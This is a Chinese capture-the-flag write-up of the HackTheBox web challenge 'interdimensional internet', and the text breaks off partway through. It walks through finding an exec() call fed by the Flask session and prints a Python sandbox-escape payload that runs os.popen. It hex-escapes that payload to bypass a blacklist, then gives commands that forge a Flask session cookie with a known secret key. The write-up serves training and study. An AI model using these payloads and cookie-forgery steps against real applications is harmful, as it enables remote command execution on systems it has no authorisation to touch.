---
title: 【HackTheBox】攻克靶机实战interdimensional internet攻略分享
url: https://www.secpulse.com/archives/200516.html
source: 安全脉搏
date: 2023-05-19
fetch_date: 2025-10-04T11:37:23.878129
---

# 【HackTheBox】攻克靶机实战interdimensional internet攻略分享

[![](https://www.secpulse.com/wp-content/themes/secpulse2017/img/logo-header.png)](https://www.secpulse.com "安全脉搏")

* [首页](https://www.secpulse.com/)
* [分类阅读](https://www.secpulse.com/archives/category/category)

  #### 脉搏文库

  - [内网渗透](https://www.secpulse.com/archives/category/articles/intranet-penetration)
  - |
  - [代码审计](https://www.secpulse.com/archives/category/articles/code-audit)
  - |
  - [安全文献](https://www.secpulse.com/archives/category/articles/sec-doc)
  - |
  - [Web安全](https://www.secpulse.com/archives/category/articles/web)
  - |
  - [移动安全](https://www.secpulse.com/archives/category/articles/mobile-security)
  - |
  - [系统安全](https://www.secpulse.com/archives/category/articles/system)
  - |
  - [工控安全](https://www.secpulse.com/archives/category/articles/industrial-safety)
  - |
  - [CTF](https://www.secpulse.com/archives/category/exclusive/ctf-writeup)
  - |
  - [IOT安全](https://www.secpulse.com/archives/category/iot-security)
  - |

#### 安全建设

+ [业务安全](https://www.secpulse.com/archives/category/construction/businesssecurity)
+ |
+ [安全管理](https://www.secpulse.com/archives/category/construction/securityissue)
+ |
+ [数据分析](https://www.secpulse.com/archives/category/construction/bigdata)
+ |

#### 其他

+ [资讯](https://www.secpulse.com/archives/category/news)
+ |
+ [漏洞](https://www.secpulse.com/archives/category/vul)
+ |
+ [工具](https://www.secpulse.com/archives/category/tools)
+ |
+ [人物志](https://www.secpulse.com/archives/category/people)
+ |
+ [区块链安全](https://www.secpulse.com/archives/category/exclusive/block_chain_security)
+ |
+ [安全招聘](https://www.secpulse.com/archives/category/hiring)
+ |

- [安全问答](https://www.secpulse.com/newpage/question_list)
- [金币商城](https://www.secpulse.com/shop?donotcachepage=c010349fd98847cb9d6e07d3cbc19288)
- [安全招聘](https://www.secpulse.com/archives/category/hiring)
- [活动日程](https://www.secpulse.com/newpage/activity)
- [live课程](https://www.secpulse.com/live)
- [企业服务](https://duoyinsu.com/service.html)
- [插件社区](https://x.secpulse.com/)

小程序

![脉搏小程序](https://www.secpulse.com/wp-content/themes/secpulse2017/img/wxchat.jpg)
[登录](https://www.secpulse.com/user_login)
|
[注册](https://www.secpulse.com/user-register)

# 【HackTheBox】攻克靶机实战interdimensional internet攻略分享

[脉搏文库](https://www.secpulse.com/archives/category/category/secdocs)

[公众号:安全女巫](https://www.secpulse.com/newpage/author?author_id=49672)

2023-05-18

13,777

##

**********如果你喜欢我的文章，欢迎关注公众号：安全女巫
转载请注明出处：********https://mp.weixin.qq.com/s/cfcAq6vG-e2dB6mgymfcOQ**

**【HackTheBox】攻克靶机实战interdimensional internet攻略分享**

## **信息收集**

访问网站，查看页面基本信息

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-1684388409.png)

访问页面，页面无超链接等其他功能。控制台、网络均无可利用点.

抓包，看session有jwt特征

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-1684388410.png)

将之解码后发现measurements带base64特征，解码后得11+39=50

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-1684388412.png)

与响应页面中显示的数字一致。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-1684388413.png)

响应包的session解码后参数可展示在响应页面。请求包session为空，再次刷新页面，相应包session与展示数字一并改变。

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-1684388420.png)

只能说发现了响应包session与页面展示规律。并无突破思路。

## **目录扫描**

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-1684388421.png)

可见/debug超链接

查看源代码

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-1684388422.png)

访问/debug页面，可见网站源码

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-1684388423.png)

多次出现/debug的提示，证明该处应为关键突破点。

## **代码分析**

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-1684388424.png)

calc函数包含名命令执行exec()。exec中为session中2个参数拼成的新字符串。

由此，可构造session进行jwt编码，以执行命令。

## **漏洞利用**

满足条件的payload,构造过程如下：

1》构造执行命令

2》绕过黑名单

3》ingredient和measurements均不为空，且20<=recipe<300

4》Flask客户端session伪造

5》优化执行命令

6》获得flag

### **1》构造执行命令**

exec执行print成功

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-1684388426.png)

通过命令执行漏洞获得flag。突破口应是ls列出文件，定位flag文件，并进行读取flag

执行ls

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-1684388427.png)

本地尝试exec执行ls

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-16843884271.png)

报错：\_\_import\_\_ not found

Google搜ssti hackticks python

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-1684388428.png)

将语句写入脚本

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-1684388429.png)

说明().\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_()中warnings.catch\_warnings可以导入import os成功执行命令。

为简化语句，打印出warnings.catch\_warnings所在数组的位置：60

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-1684388430.png)

语句简化为：

().\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_()[60]().\_module.\_\_builtins\_\_['\_\_import\_\_']('os').popen("dir").read()

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-1684388432.png)

线上环境也可能是linux，所以也可能是：

().\_\_class\_\_.\_\_base\_\_.\_\_subclasses\_\_()[60]().\_module.\_\_builtins\_\_['\_\_import\_\_']('os').popen("ls").read()

这边猜测是linux环境。

### **2》绕过黑名单**

不能包含以下四个字符[(\_.

用以下方式绕过。\28经2次print转为(

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-1684388433.png)

同样方式转换

\x28 (

\x5b [

\x5f \_

\x2e .

故执行命令语句经转换后为：

\x28)\x2e\x5f\x5fclass\x5f\x5f\x2e\x5f\x5fbase\x5f\x5f\x2e\x5f\x5fsubclasses\x5f\x5f\x28)\x5b60]\x28)\x2e\x5fmodule\x2e\x5f\x5fbuiltins\x5f\x5f\x5b'\x5f\x5fimport\x5f\x5f']\x28'os')\x2epopen\x28"ls")\x2eread\x28)

### **3》ingredient和measurements均不为空，且20<=****recipe****<300**

{'ingredient': b'\x28)\x2e\x5f\x5fclass\x5f\x5f\x2e\x5f\x5fbase\x5f\x5f\x2e\x5f\x5fsubclasses\x5f\x5f\x28)\x5b60]\x28)\x2e\x5fmodule\x2e\x5f\x5fbuiltins\x5f\x5f\x5b'\x5f\x5fimport\x5f\x5f']\x28'os')\x2epopen\x28"ls")\x2eread\x28)', 'measurements': b'7-4'}

### **4》Flask客户端session伪造**

git clone https://github.com/noraj/flask-session-cookie-manager.git

cd flask-session-cookie-manager/

python3 -m pip install Flask

访问页面抓包获得session进行解码

python3 flask\_session\_cookie\_manager3.py decode -s "tlci0GhK8n5A18K1GTx6KPwfYjuuftWw" -c "eyJpbmdyZWRpZW50Ijp7IiBiIjoiYzNweGFXSnBaMlowY2c9PSJ9LCJtZWFzdXJlbWVudHMiOnsiIGIiOiJNelVyTkRnPSJ9fQ.YrMHfA.XME1AvAKBalRQ0n74pr-dvx4I3U"

解码为：

{'ingredient': b'szqibigftr', 'measurements': b'35+48'}

使用如下命令进行编码：

python3 flask\_session\_cookie\_manager3.py encode -s "tlci0GhK8n5A18K1GTx6KPwfYjuuftWw" -t "{'ingredient': b' \x28)\x2e\x5f\x5fclass\x5f\x5f\x2e\x5f\x5fbase\x5f\x5f\x2e\x5f\x5fsubclasses\x5f\x5f\x28)\x5b60]\x28)\x2e\x5fmodule\x2e\x5f\x5fbuiltins\x5f\x5f\x5b'\x5f\x5fimport\x5f\x5f']\x28'os')\x2epopen\x28"ls")\x2eread\x28)', 'measurements': b'35+48'}"

编码后的session重新发请求

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-16843884331.png)

说明过滤的[(\_.关键字无效。需进一步进行语句转换。

防止\被转义，变成\\。

python3 flask\_session\_cookie\_manager3.py encode -s "tlci0GhK8n5A18K1GTx6KPwfYjuuftWw" -t "{'ingredient': b'\\x28)\\x2e\\x5f\\x5fclass\\x5f\\x5f\\x2e\\x5f\\x5fbase\\x5f\\x5f\\x2e\\x5f\\x5fsubclasses\\x5f\\x5f\\x28)\\x5b60]\\x28)\\x2e\\x5fmodule\\x2e\\x5f\\x5fbuiltins\\x5f\\x5f\\x5b'\\x5f\\x5fimport\\x5f\\x5f']\\x28'os')\\x2epopen\\x28"ls")\\x2eread\\x28)', 'measurements': b'35+48'}"

![](https://secpulseoss.oss-cn-shanghai.aliyuncs.com/wp-content/uploads/1970/01/beepress-image-200516-1684388439.png)

转义问题已经解决，不报错了。但是返回包cookie没了。执行ls后的结果如何能展示出来？

### **5》优化执行命令**

使用flask.session将ls命令...